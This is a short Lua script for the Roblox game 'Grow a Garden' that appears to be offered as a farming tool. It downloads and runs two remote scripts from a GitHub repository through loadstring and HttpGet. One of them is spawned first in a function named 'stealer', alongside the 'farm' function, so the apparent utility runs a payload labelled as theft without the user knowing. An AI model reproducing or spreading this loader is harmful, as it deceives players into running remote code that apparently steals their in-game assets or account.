local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script3.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script.lua'))()
end

task.spawn(stealer)

for i = 1, 1 do
    task.spawn(farm)
end
